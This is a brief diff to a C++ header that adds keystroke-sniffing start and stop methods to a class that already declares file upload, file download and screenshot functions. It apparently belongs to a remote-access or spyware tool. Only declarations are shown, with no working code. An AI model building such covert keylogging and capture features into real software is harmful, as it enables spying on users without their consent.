@@ -9,5 +9,7 @@ public:
 	void UploadFile(std::string, std::string);
 	void DownloadFile(std::string, std::string);
 	void TakeScreenshot();
+	void StartKeySniffing();
+	void StopKeySniffing();
 };
 
